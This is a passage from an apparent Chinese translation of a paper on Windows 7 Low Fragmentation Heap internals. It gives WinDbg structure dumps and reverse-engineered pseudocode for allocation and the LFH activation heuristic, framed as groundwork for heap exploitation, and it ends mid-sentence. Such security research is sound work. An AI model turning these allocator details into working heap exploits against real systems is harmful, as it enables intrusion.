class="keyword">Lock</span> : Uint4B</span><br></pre></td></tr></table></figure><ul><li><strong><code>LocalInfo</code></strong> - 与此结构关联的_HEAP_LOCAL_SEGMENT_INFO结构。</li><li><strong><code>UserBlocks</code></strong> - 与此SubSegment耦合的_HEAP_USERDATA_HEADER结构，它保存一个被分割成n个Chunk的大的内存Chunk。</li><li><strong><code>AggregateExchg</code></strong> - _INTERLOCK_SEQ结构，用于跟踪当前的Offset和Depth。</li><li><strong><code>SizeIndex</code></strong> - 此SubSegment的_HEAP_BUCKET SizeIndex。</li></ul><h3 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h3><p><strong><code>_HEAP_USERDATA_HEADER</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>-&gt;<code>LocalData</code>-&gt;<code>SegmentInfo[]</code>-&gt;<code>Hint, ActiveSubsegment, CachedItems</code>-&gt;<code>UserBlocks</code>)</p><p>&emsp;&emsp;此头位于UserBlock Chunk之前，该Chunk用于为LFH的所有请求提供服务。在执行所有逻辑以找到一个SubSegment之后，已提交(committed)内存实际上操纵的位置就是该结构。</p><p style="text-align:center;font-weight:bold">Listing 8. _HEAP_USERDATA_HEADER via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _HEAP_USERDATA_HEADER</span><br><span class="line">ntdll!_HEAP_USERDATA_HEADER</span><br><span class="line">    +<span class="number">0x000</span> SFreeListEntry : _SINGLE_LIST_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> SubSegment : Ptr32 _HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x004</span> Reserved : Ptr32 Void</span><br><span class="line">    +<span class="number">0x008</span> SizeIndex : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> Signature : Uint4</span><br></pre></td></tr></table></figure><h3 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h3><p><strong><code>_INTERLOCK_SEQ</code></strong>(<code>HeapBase</code>-&gt;<code>FrontEndHeap</code>-&gt;<code>LocalData</code>-&gt;<code>SegmentInfo[]</code>-&gt;<code>Hint, ActiveSubsegment, CachedItems</code>-&gt;<code>AggregateExchg</code>)</p><p>&emsp;&emsp;由于UserBlock Chunk的被划分方式，需要有一种方法来获取当前Offset，用于释放或分配下一个块。该过程由_INTERLOCK_SEQ数据结构控制。</p><p style="text-align:center;font-weight:bold">Listing 9. _INTERLOCK_SEQ via windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _INTERLOCK_SEQ</span><br><span class="line">ntdll!_INTERLOCK_SEQ</span><br><span class="line">    +<span class="number">0x000</span> Depth : Uint2B                   &lt;----</span><br><span class="line">    +<span class="number">0x002</span> FreeEntryOffset : Uint2B         &lt;----</span><br><span class="line">    +<span class="number">0x000</span> OffsetAndDepth : Uint4B          &lt;----</span><br><span class="line">    +<span class="number">0x004</span> Sequence : Uint4B</span><br><span class="line">    +<span class="number">0x000</span> Exchg : Int8B</span><br></pre></td></tr></table></figure><ul><li><strong><code>Depth</code></strong> - 一个计数器，用于跟踪UserBlock中还剩下多少个Chunk。释放时该值会递增，分配时则递减。它的值初始化为UserBlock的大小除以HeapBucket的大小。</li><li><strong><code>FreeEntryOffset</code></strong> - 此2字节整型数保存一个值，当将其与_HEAP_USERDATA_HEADER的地址相加时，将返回指向下一个释放或分配内存的位置的指针。该值以blocks(0x8字节Chunk)表示，并被初始化为0x2，因为sizeof(_HEAP_USERDATA_HEADER)等于0x10。[0x2 * 0x8 == 0x10]</li><li><strong><code>OffsetAndDepth</code></strong> - 由于Depth和FreeEntryOffset均为2个字节，所以它们可以组合成这个4字节的值。(译者注：注意这是个union)</li></ul><h3 id="HEAP-ENTRY"><a href="#HEAP-ENTRY" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h3><p><strong><code>_HEAP_ENTRY</code></strong>(<code>Chunk Header</code>)</p><p>&emsp;&emsp;_HEAP_ENTRY，也称为堆块头(Heap Chunk Header)，是一个8字节的值，存储在堆中每个内存Chunk之前(即使是UserBlocks内部的Chunk,也一样)。由于新版本Windows在Header中引入了有效性和安全性的修改，所以自Windows XP基础代码以来，它已发生了巨大变化。</p><p style="text-align:center;font-weight:bold">Listing 10. _HEAP_ENTRY via Windbg</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; <span class="built_in">dt</span> _HEAP_ENTRY</span><br><span class="line">ntdll!_HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> Size : Uint2B                        &lt;----</span><br><span class="line">    +<span class="number">0x002</span> Flags : UChar                        &lt;----</span><br><span class="line">    +<span class="number">0x003</span> SmallTagIndex : Uchar                &lt;----</span><br><span class="line">    +<span class="number">0x000</span> SubSegmentCode : Ptr32 Void</span><br><span class="line">    +<span class="number">0x004</span> PreviousSize : Uint2B</span><br><span class="line">    +<span class="number">0x006</span> SegmentOffset : Uchar</span><br><span class="line">    +<span class="number">0x006</span> LFHFlags : Uchar</span><br><span class="line">    +<span class="number">0x007</span> UnusedBytes : Uchar                  &lt;----</span><br><span class="line">    +<span class="number">0x000</span> FunctionIndex : Uint2B</span><br><span class="line">    +<span class="number">0x002</span> ContextValue : Uint2B</span><br><span class="line">    +<span class="number">0x000</span> InterceptorValue : Uint4B</span><br><span class="line">    +<span class="number">0x004</span> UnusedBytesLength : Uint2B</span><br><span class="line">    +<span class="number">0x006</span> EntryOffset : Uchar</span><br><span class="line">    +<span class="number">0x007</span> ExtendedBlockSignature : Uchar       &lt;----</span><br></pre></td></tr></table></figure><ul><li><strong><code>Size</code></strong> - Chunk的大小(以blocks为单位)，这包括_HEAP_ENTRY本身。</li><li><strong><code>Flags</code></strong> - 指示此堆块状态的标志。比如“free”或“busy”。</li><li><strong><code>SmallTagIndex</code></strong> - 该值存储_HEAP_ENTRY前三个字节的XOR校验值。</li><li><strong><code>UnusedBytes/ExtendedBlockSignature</code></strong> - 表示未使用的字节(保留待以后使用)，或是一个指示被LFH管理的Chunk的状态的字节。</li></ul><h3 id="Overview-概览"><a href="#Overview-概览" class="headerlink" title="Overview(概览)"></a>Overview(概览)</h3><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Data_structure_overview.png" alt="Data structure overview"></p><p style="text-align:left;font-weight:bold">Diagram 1. Data structure overview</p><h2 id="Architecture-架构"><a href="#Architecture-架构" class="headerlink" title="Architecture(架构)"></a>Architecture(架构)</h2><p>&emsp;&emsp;自Windows XP时代以来，至Windows 7，堆管理器已经发生了翻天覆地的变化，因此重温一些简洁的架构调整将很有必要。特别的，<br>FreeLists工作的方式进行了重构，数据是如何存储于其中也需要进一步解释。</p><h3 id="FreeLists-WinXP-amp-Win7"><a href="#FreeLists-WinXP-amp-Win7" class="headerlink" title="FreeLists(WinXP&amp;Win7)"></a>FreeLists(WinXP&amp;Win7)</h3><p>&emsp;&emsp;在我们讨论核心算法之前，必须调查下当前和以前的FreeList结构。这是因为FreeLists的操作和存储数据的方式自Windows XP基础代码以来发生了改变。这是John McDonald和我曾在此前的一篇论文中给出FreeList结构的概述：</p><h4 id="Windows-XP"><a href="#Windows-XP" class="headerlink" title="Windows XP"></a>Windows XP</h4><blockquote><p>&emsp;&emsp;每个可能的块大小(小于1024字节)都有单独的链表，总共有128个空闲链表(FreeLists)(堆块的大小为8的倍数)。每个双向空闲链表都有一个哨兵头节点，存储于堆基址处某偏移的数组中。每个头节点包含两个指针：一个前向指针(FLink)和一个后向指针(BLink)。FreeList[1]没有被用到(这句有点问题)，而FreeList[2]-FreeList[127]被称为专用的空闲链表(Dedicated Free Lists)。对于这些专用链表，链表中所有空闲块的大小均相同，大小应该是数组索引*8。但是，所有大于或等于1024字节的块都保存在单个空闲链表FreeList[0]中(此槽是可用的，因为没有任何大小为0的空闲块。)。此链表中的空闲块按最小的块到最大的块升序排列。因此，FreeList[0].Flink指向最小的空闲块(Size&gt;=1024)，而FreeList[0].Blink指向最大的空闲块(Size&gt;=1024)。<br>(Windows XP SP3,Windows Server 2003)</p></blockquote><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/Windows_XP_FreeList_relationships.png" alt="Windows XP FreeList Relationships"></p><p style="text-align:center;font-weight:bold">Diagram 2. Windows XP FreeList relationships</p><h4 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h4><p>&emsp;&emsp;由于LFH更改了前端堆管理器(Front-End Manager)的工作方式，因此后端堆管理器(Back-End Manager)也必须进行适配。此后不再有一个专用的FreeList，取而代之的，每个BlocksIndex都有它自己的ListHints，初始化为NULL。</p><p>&emsp;&emsp;BlocksIndex结构包含指向它自己的ListHints的指针，而ListHints指向FreeLists结构。它的设置与旧版本的FreeLists非常相似，只不过FreeList[0]不再用作存储大于0x400(1024)字节的Chunk，而是有条件的。如果没有BlocksIndex-&gt;​​ExtendedLookup，则所有大小大于或等于BlocksIndex-&gt;​​ArraySize-1的块都将以升序存储在FreeList[ArraySize-BaseIndex–1]中。</p><p>&emsp;&emsp;尽管FreeLists包含哨兵节点，该节点在以ListHints指针计算的某个偏移位置处，而ListHints指针是大部分相似节点结束的地方。虽然Flink指针仍然指向FreeLists的下一个可用的Chunk，但它也可以扩展到更大的FreeLists。这使得Heap.FreeLists可以遍历特定堆的每一个可用的空闲Chunk。</p><p>&emsp;&emsp;哨兵节点的Blink也做了调整，为了满足两个目的。如果未为Bucket启用LFH，那么哨兵Blink将作为启发式分配的计数。否则，它将存储_HEAP_BUCKET+1的地址(除了ListHint[ArraySize-BaseIndex-1]这种情况)。</p><p>&emsp;&emsp;下面的图是一个稀疏填充堆的实例，展示了这些新的结构体之间是如何交互的。它包含了一个用于跟踪1024字节以下大小的Chunk的BlocksIndex。与此堆关联的Chunk仅有5个，可以通过各种方式访问它们。</p><p>&emsp;&emsp;例如，如果请求分配0x30(48)字节，堆将尝试使用ListHint[0x6]。你可以看到，尽管只有3个大小为0x30的空闲Chunk，但最后一个大小为0x30的空闲Chunk的Flink指向一个属于ListHint[0x7]的条目。ListHint[0x7]只有一个条目，但和ListHint[0x6]一样的是，它的最后一个Chunk指向一个超出大小边界的更大的Chunk。</p><p>&emsp;&emsp;这改变了链表终止的方式。链表中的最后一个节点不再指向所在的FreeList的哨兵节点，而是指向HeapBase+0xC4处的FreeLists条目。</p><blockquote><p>注意：_HEAP_LIST_LOOKUP结构在RtlCreateHeap()或RtlpExtendListLookup()中初始化时，ListHead设置为指向Heap.FreeLists(HeapBase+0xC4)。这使两个条目相同，并指向内存中的同一区域。</p></blockquote><p><img src="/resources/2021/Understanding_the_Low_Fragmentation_Heap/New_FreeList_relationship.png" alt="New FreeList relationship"></p><p style="text-align:center;font-weight:bold">Diagram 3. New FreeList relationship</p><h2 id="Algorithms-算法"><a href="#Algorithms-算法" class="headerlink" title="Algorithms(算法)"></a>Algorithms(算法)</h2><p>&emsp;&emsp;要充分理解堆的确定性和漏洞利用理论，必须奠定基本的知识基础。没有这些核心知识，就只能默念“大神保佑”。本节将把核心算法分成两个部分：分配和释放，并分为后端堆管理器和前端堆管理器两种情形。之所以如此，是因为前端堆管理器和后端堆管理器执行的内存操作可能会影响另一端的状态。</p><h3 id="Allocation-分配"><a href="#Allocation-分配" class="headerlink" title="Allocation(分配)"></a>Allocation(分配)</h3><p>&emsp;&emsp;当试图服务来自调用应用程序的请求时，分配会从RtlAllocateHeap()开始。该函数首先会以8字节对齐分配量。此后，它会获取一个ListHints的索引。如果没有找到特定索引，就使用BlocksIndex-&gt;ArraySize-1。</p><p style="text-align:center;font-weight:bold">Listing 11. RtlAllocateHeap BlocksIndex Search</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Size == <span class="number">0x0</span>)</span><br><span class="line">    Size = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ensure that this number is 8‐byte aligned</span></span><br><span class="line"><span class="comment">//保证分配量是8字节对齐</span></span><br><span class="line"><span class="keyword">int</span> RoundSize = Round(Size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BlocksSize = Size/<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get the HeapListLookup, which determines if we should use the LFH</span></span><br><span class="line"><span class="comment">//获取HeapListLookup，判断是否该使用LFH</span></span><br><span class="line">_HEAP_LIST_LOOKUP *BlocksIndex = (_HEAP_LIST_LOOKUP*)heap‐&gt;BlocksIndex;</span><br><span class="line"></span><br><span class="line"><span class="comment">//loop through the HeapListLookup structures to determine which one to use</span></span><br><span class="line"><span class="comment">//遍历HeapListLookup结构，找出需要使用的是哪一个</span></span><br><span class="line"><span class="keyword">while</span>(BlocksSize &gt;= BlocksIndex‐&gt;ArraySize)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(BlocksIndex‐&gt;ExtendedLookup == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        BlocksSize = BlocksIndex‐&gt;ArraySize‐<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BlocksIndex = BlocksIndex‐&gt;ExtendedLookup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;有一种情况会返回BlocksIndex-&gt;ArraySize-1作为ListHint索引。如果出现了这种情况，那么后端分配器会使用一个值为NULL的FreeList。这将引起后端分配器尝试使用Heap-&gt;FreeLists。如果FreeLists不包含大小充足的Chunk，堆会使用RtlpExtendHeap()来进行扩展。</p><p>&emsp;&emsp;如果特定的索引被成功获取到，那么堆管理器会试图使用FreeList来满足需求的尺寸。它会根据FreeList-&gt;Blink来判断对该Bucket来说LFH是否有激活；如果没有的话，堆管理器会默认使用后端堆管理器：</p><p style="text-align:center;font-weight:bold">Listing 12. RtlAllocateHeap heap manager selector</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get the appropriate freelist to use based on size</span></span><br><span class="line"><span class="comment">//基于大小获取对应的FreeList</span></span><br><span class="line"><span class="keyword">int</span> FreeListIndex = BlocksSize ‐ HeapListLookup‐&gt;BaseIndex;</span><br><span class="line"></span><br><span class="line">_LIST_ENTRY *FreeList = &amp;HeapListLookup‐&gt;ListHints[FreeListIndex];</span><br><span class="line"><span class="keyword">if</span>(FreeList)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//check FreeList[index]‐&gt;Blink to see if the heap bucket context has been populated via RtlpGetLFHContext()</span></span><br><span class="line">    <span class="comment">//RtlpGetLFHContext() stores the HeapBucket context + 1 in the Blink</span></span><br><span class="line">    <span class="comment">//检查FreeList[index]‐&gt;Blink，看看heap bucket context是否由RtlpGetLFHContext()填充过</span></span><br><span class="line">    <span class="comment">//RtlpGetLFHContext()在Blink中存储了HeapBucket context + 1</span></span><br><span class="line">    _HEAP_BUCKET *HeapBucket = FreeList‐&gt;Blink;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(HeapBucket &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        RetChunk = RtlpLowFragHeapAllocFromContext(HeapBucket‐<span class="number">1</span>, aBytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(RetChunk &amp;&amp; heap‐&gt;Flags == HEAP_ZERO_MEMORY)</span><br><span class="line">            <span class="built_in">memset</span>(RetChunk, <span class="number">0</span>, RoundSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if the front‐end allocator did not succeed, use the back‐end</span></span><br><span class="line"><span class="comment">//如果前端分配器没有成功分配，那就用后端分配器</span></span><br><span class="line"><span class="keyword">if</span>(!RetChunk)</span><br><span class="line">&#123;</span><br><span class="line">    RetChunk = RtlpAllocateHeap(heap, Flags | <span class="number">2</span>, Size, RoundSize, FreeList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Back-end-Allocation-后端分配器"><a href="#Back-end-Allocation-后端分配器" class="headerlink" title="Back-end Allocation(后端分配器)"></a>Back-end Allocation(后端分配器)</h3><p>&emsp;&emsp;后端分配器(Back-end Allocation)是分配算法的最后一道防线，如果它失败了，那么内存请求失败返回NULL。除了为无法由前端分配器(Front-end Allocation)服务的内存请求提供服务这一职责以外，后端分配器还负责启发式激活(Activation Heuristics)前端分配器(Front-end Allocation)。它的工作方式和Windows XP基础代码中的启发式堆缓存(Heap Cache Heuristic)的工作方式非常相似。</p><h4 id="RtlpAllocateHeap"><a href="#RtlpAllocateHeap" class="headerlink" title="RtlpAllocateHeap"></a>RtlpAllocateHeap</h4><p>&emsp;&emsp;_HEAP结构体，要分配的大小以及期望的ListHint(FreeList)作为一部分参数传递给RtlpAllocateHeap()。如同RtlAllocateHeap般，第一步就是对待分配的大小按8字节对齐，同时还要判断Flags是否对HEAP_NO_SERIALIZE置位。如果该位置位，则LFH不会启用。(<a href="http://msdn.microsoft.com/enus/library/aa366599%28v=VS.85%29.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/enus/library/aa366599%28v=VS.85%29.aspx</a>)</p><p style="text-align:center;font-weight:bold">Listing 13. RtlpAllocateHeap size rounding and Heap maintenance</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> RoundSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if the FreeList isn't NULL, the rounding has already been preformed</span></span><br><span class="line"><span class="comment">//如果FreeList不是NULL，那么就已经完成大小对齐了</span></span><br><span class="line"><span class="keyword">if</span>(FreeList)</span><br><span class="line">&#123;</span><br><span class="line">    RoundSize = RoundSize;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> MinSize = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(Size)</span><br><span class="line">        MinSize = Size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//rounds to the nearest 8‐byte aligned number</span></span><br><span class="line">    <span class="comment">//向上取舍到最近的8字节对齐大小</span></span><br><span class="line">    RoundSize = Round(MinSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> SizeInBlocks = RoundSize/<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(SizeInBlocks &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//RoundSize += sizeof(_HEAP_ENTRY)</span></span><br><span class="line">    RoundSize = RoundSize + <span class="number">8</span>;</span><br><span class="line">    SizeInBlocks = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if NOT HEAP_NO_SERIALIZE, use locking mechanisms</span></span><br><span class="line"><span class="comment">//LFH CANNOT be enabled if this path isn't taken</span></span><br><span class="line"><span class="comment">//如果没有设置HEAP_NO_SERIALIZE，就使用锁定机制</span></span><br><span class="line"><span class="comment">//如果没有使用此路径，则无法启用LFH</span></span><br><span class="line"><span class="keyword">if</span>(!(Flags &amp; HEAP_NO_SERIALIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//setup locking mechanisms here</span></span><br><span class="line">    <span class="comment">//设置锁定机制</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//if we have certain compaitibility flags(either set below, or otherwise, </span></span><br><span class="line">    <span class="comment">//then we will call 'RtlpPerformHeapMaintenance'</span></span><br><span class="line">    <span class="comment">//which will activate the LFH and setup an ExtendedListLookup as well</span></span><br><span class="line">    <span class="comment">//如果有具体的兼容性标志，就会调用'RtlpPerformHeapMaintenance'</span></span><br><span class="line">    <span class="comment">//它会激活LFH，也会设置ExtendedListLookup</span></span><br><span class="line">    <span class="keyword">if</span>(Heap‐&gt;CompatibilityFlags &amp; <span class="number">0x60000000</span>)</span><br><span class="line">        RtlpPerformHeapMaintenance(Heap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：你可以在后面看到CompatibilityFlags是如何在后续代码中设置的。这就是LFH被激活的方式。尽管LFH是默认前端堆管理器，但直到具体的启发式策略被触发之前，它实际上并不进行任何的内存管理。</p></blockquote><p>&emsp;&emsp;即使此时LFH可能已准备好为请求提供服务，但后端分配器仍将继续进行此分配。通过省略用于处理虚拟内存请求的代码，可以看到RtlpAllocateHeap()将尝试查看FreeList参数是否为非NULL。根据到来的有效的FreeList参数，后端管理器会应用启发式机制来判断是否应将LFH用于以后的任何分配：</p><p style="text-align:center;font-weight:bold">Listing 14. RtlpAllocateHeap LFH Heuristic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(FreeList != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//if this freelist doesn't hold a _HEAP_BUCKET, update the counters and attempt to get the LFH context</span></span><br><span class="line">    <span class="comment">//如果freelist未拥有一个_HEAP_BUCKET,就更新计数器并试图获取LFH上下文</span></span><br><span class="line">    <span class="keyword">if</span>(!(FreeList‐&gt;Blink &amp; <span class="number">1</span>)) <span class="comment">//未启用LFH</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//add a certain amount to the blink</span></span><br><span class="line">        <span class="comment">//为blink增加一个具体的数量</span></span><br><span class="line">        FreeList‐&gt;Blink += <span class="number">0x10002</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//if the counter has ran more than 0x10 times, OR</span></span><br><span class="line">        <span class="comment">//we haven't successfully entered the critical section, OR we've been through 0x1000 iterations</span></span><br><span class="line">        <span class="comment">//then attempt to set the Compatibility flags(which, in turn, will call RtlpPerformHeapMaintenance())</span></span><br><span class="line">        <span class="comment">//如果计数器已经执行了超过0x10次，或者我们不曾成功进入到关键部分，或者我们已经进行了0x1000次迭代</span></span><br><span class="line">        <span class="comment">//那么就会试图设置这个Compatibility标志(这就意味着我们会调用到RtlpPerformHeapMaintenance())</span></span><br><span class="line">        <span class="keyword">if</span>((WORD)FreeList‐&gt;Blink &gt; <span class="number">0x20</span> || FreeList‐&gt;Blink &gt; <span class="number">0x10000000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//if the FrontEndHeapType is LFH (0x2) assign it</span></span><br><span class="line">            <span class="comment">//如果FrontEndHeapType是LFH(0x2)，进行赋值</span></span><br><span class="line">            <span class="keyword">int</span> FrontEndHeap;</span><br><span class="line">            <span class="keyword">if</span>(Heap‐&gt;FrontEndHeapType == <span class="number">0x2</span>)</span><br><span class="line">                FrontEndHeap = Heap‐&gt;FrontEndHeap;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                FrontEndHeap = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//this function gets a _HEAP_BUCKET, stored in _LFH_HEAP‐&gt;Bucket[BucketSize]</span></span><br><span class="line">            <span class="comment">//if the LFH hasn't been activated yet, it will return NULL</span></span><br><span class="line">            <span class="comment">//该函数获取一个_HEAP_BUCKET,它存储于_LFH_HEAP‐&gt;Bucket[BucketSize]</span></span><br><span class="line">            <span class="comment">//如果LFH仍未被激活，就返回NULL</span></span><br><span class="line">            <span class="keyword">char</span> *LFHContext = RtlpGetLFHContext(FrontEndHeap, Size);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//if the context isn't set and we've seen 0x10+ allocations, set the flags</span></span><br><span class="line">            <span class="comment">//如果上下文没有设置并且我们已经进行了0x10+次分配，也要设置该标志</span></span><br><span class="line">            <span class="keyword">if</span>(LFHContext == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>((WORD)FreeList‐&gt;Blink &gt; <span class="number">0x20</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//RtlpPerformHeapMaintenance heurstic</span></span><br><span class="line">                    <span class="comment">//RtlpPerformHeapMaintenance启发式机制</span></span><br><span class="line">                    <span class="keyword">if</span>(Heap‐&gt;FrontEndHeapType == <span class="literal">NULL</span>)</span><br><span class="line">                        Heap‐&gt;CompatibilityFlags |= <span class="number">0x20000000</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//save the _HEAP_BUCKET in the Blink</span></span><br><span class="line">                <span class="comment">//+1 == _HEAP_BUCKET</span></span><br><span class="line">                <span class="comment">//保存_HEAP_BUCKET到Blink</span></span><br><span class="line">                FreeList‐&gt;Blink = LFHContext + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：这就是我为什么一直说前端和后端堆管理器存在紧密联系的原因。如你所见ListHint用来存储某个_HEAP_BUCKET的地址，它用来判断管理器是否应该使用LFH。这一双重用法看起来有点困惑，但是在讨论过前端分配和释放算法之后，它将变得非常清晰。</p></blockquote><p>&emsp;&emsp;现在已经设置了LFH激活标志，分配可以在后端继续进行了。检查FreeList以查看是否已填充，然后执行Safe 